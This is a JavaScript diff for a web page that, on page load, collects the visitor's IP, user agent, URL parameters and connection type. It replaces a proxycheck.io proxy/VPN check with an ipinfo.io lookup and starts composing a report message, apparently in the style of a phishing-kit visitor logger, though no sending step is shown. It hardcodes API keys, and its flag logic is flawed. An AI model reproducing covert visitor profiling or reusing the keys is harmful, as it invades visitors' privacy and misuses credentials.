@@ -56,13 +56,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
     const urlParams = new URLSearchParams(window.location.search);
     const userAgent = navigator.userAgent;
-
-fetch('https://proxycheck.io/v2/' + ip + '?key=3vni80-902484-5s79i4-9455j5')
-    .then(response => response.json())
-    .then(data => {
-        const isProxy = data[ip].proxy ? "Yes" : "No";
-        const isVPN = data[ip].vpn ? "Yes" : "No";
-
+    
 fetch('https://ipapi.co/json/')
     .then(response => response.json())
     .then(data => {
@@ -114,6 +108,16 @@ fetch('https://ipapi.co/json/')
   
   
     let TypeInternet = navigator.connection.effectiveType;
+
+    fetch('https://ipinfo.io/' + ip + '/json?token=afae6637fcf7bf')
+    .then(response => response.json())
+    .then(data => {
+        const isProxy = data.proxy ? "Yes" : "No";
+        const isVPN = data.tor ? "Yes" : "No";
+
+    });
+
+
       
         const message = `
       * Ip 🌐*
